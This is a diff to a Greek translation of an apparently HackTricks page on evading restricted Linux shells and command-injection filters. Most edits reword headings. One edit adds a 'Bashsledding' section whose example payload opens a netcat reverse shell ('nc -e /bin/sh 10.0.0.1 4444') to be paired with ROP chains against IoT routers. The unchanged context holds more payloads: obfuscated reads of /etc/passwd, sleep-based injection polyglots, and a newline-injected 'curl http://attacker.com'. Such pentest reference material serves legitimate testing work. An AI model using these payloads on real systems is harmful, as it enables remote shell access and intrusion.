@@ -2,7 +2,7 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Συνήθεις Παράκαμψεις Περιορισμών
+## Συνηθισμένες Παράκαμψεις Περιορισμών
 
 ### Αντίστροφη Σκηνή
 ```bash
@@ -105,7 +105,7 @@ echo "ls\x09-l" | bash
 $u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
 uname!-1\-a # This equals to uname -a
 ```
-### Παράκαμψη της κάθετης και της οριζόντιας γραμμής
+### Παράκαμψη της αντίστροφης και της κανονικής κάθετης γραμμής
 ```bash
 cat ${HOME:0:1}etc${HOME:0:1}passwd
 cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
@@ -145,7 +145,7 @@ echo ${PATH:0:1} #/
 ### Builtins
 
 Σε περίπτωση που δεν μπορείτε να εκτελέσετε εξωτερικές συναρτήσεις και έχετε πρόσβαση μόνο σε ένα **περιορισμένο σύνολο builtins για να αποκτήσετε RCE**, υπάρχουν μερικά χρήσιμα κόλπα για να το κάνετε. Συνήθως **δεν θα μπορείτε να χρησιμοποιήσετε όλα** τα **builtins**, οπότε θα πρέπει να **γνωρίζετε όλες τις επιλογές σας** για να προσπαθήσετε να παρακάμψετε τη φυλακή. Ιδέα από [**devploit**](https://twitter.com/devploit).\
-Πρώτα απ' όλα, ελέγξτε όλα τα [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Στη συνέχεια, εδώ έχετε μερικές **συστάσεις**:
+Πρώτα απ' όλα ελέγξτε όλα τα [**shell builtins**](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)**.** Στη συνέχεια, εδώ έχετε μερικές **συστάσεις**:
 ```bash
 # Get list of builtins
 declare builtins
@@ -202,7 +202,7 @@ if [ "a" ]; then echo 1; fi # Will print hello!
 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
 /*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
 ```
-### Παράκαμψη πιθανών regex
+### Παράκαμψη πιθανών regexes
 ```bash
 # A regex that only allow letters and numbers might be vulnerable to new line characters
 1%0a`curl http://attacker.com`
@@ -294,7 +294,7 @@ ln /f*
 'sh x'
 'sh g'
 ```
-## Παράκαμψη Read-Only/Noexec/Distroless
+## Read-Only/Noexec/Distroless Bypass
 
 Αν βρίσκεστε μέσα σε ένα σύστημα αρχείων με τις **προστασίες read-only και noexec** ή ακόμα και σε ένα distroless container, υπάρχουν ακόμα τρόποι να **εκτελέσετε αυθαίρετους δυαδικούς κωδικούς, ακόμα και ένα shell!:**
 
@@ -302,17 +302,39 @@ ln /f*
 bypass-fs-protections-read-only-no-exec-distroless/
 {{#endref}}
 
-## Παράκαμψη Chroot & άλλων Jails
+## Chroot & other Jails Bypass
 
 {{#ref}}
 ../privilege-escalation/escaping-from-limited-bash.md
 {{#endref}}
+
+## Space-Based Bash NOP Sled ("Bashsledding")
+
+Όταν μια ευπάθεια σας επιτρέπει να ελέγξετε εν μέρει ένα επιχείρημα που τελικά φτάνει στο `system()` ή σε άλλο shell, μπορεί να μην γνωρίζετε την ακριβή απόσταση στην οποία η εκτέλεση αρχίζει να διαβάζει το payload σας. Οι παραδοσιακοί NOP sleds (π.χ. `\x90`) **δεν** λειτουργούν στη σύνταξη του shell, αλλά το Bash θα αγνοήσει αβλαβώς τα αρχικά κενά πριν εκτελέσει μια εντολή.
+
+Επομένως, μπορείτε να δημιουργήσετε ένα *NOP sled για το Bash* προσθέτοντας ένα μακρύ σύνολο κενών ή χαρακτήρων tab πριν από την πραγματική σας εντολή:
+```bash
+# Payload sprayed into an environment variable / NVRAM entry
+"                nc -e /bin/sh 10.0.0.1 4444"
+# 16× spaces ───┘ ↑ real command
+```
+Αν μια αλυσίδα ROP (ή οποιαδήποτε πρωτοβουλία διαφθοράς μνήμης) προσγειώσει τον δείκτη εντολών οπουδήποτε μέσα στο μπλοκ χώρου, ο αναλυτής Bash απλά παραλείπει τα κενά μέχρι να φτάσει στο `nc`, εκτελώντας την εντολή σας αξιόπιστα.
+
+Πρακτικές περιπτώσεις χρήσης:
+
+1. **Μπλοκ διαμόρφωσης που είναι χαρτογραφημένα στη μνήμη** (π.χ. NVRAM) που είναι προσβάσιμα σε διάφορες διεργασίες.
+2. Καταστάσεις όπου ο επιτιθέμενος δεν μπορεί να γράψει NULL bytes για να ευθυγραμμίσει το payload.
+3. Ενσωματωμένες συσκευές όπου είναι διαθέσιμο μόνο το BusyBox `ash`/`sh` – επίσης αγνοούν τα αρχικά κενά.
+
+> 🛠️  Συνδυάστε αυτό το κόλπο με ROP gadgets που καλούν το `system()` για να αυξήσετε δραματικά την αξιοπιστία της εκμετάλλευσης σε δρομολογητές IoT με περιορισμένη μνήμη.
 
 ## Αναφορές & Περισσότερα
 
 - [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
 - [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
 - [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
-- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secju
+- [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)
+
+- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
 
 {{#include ../../banners/hacktricks-training.md}}
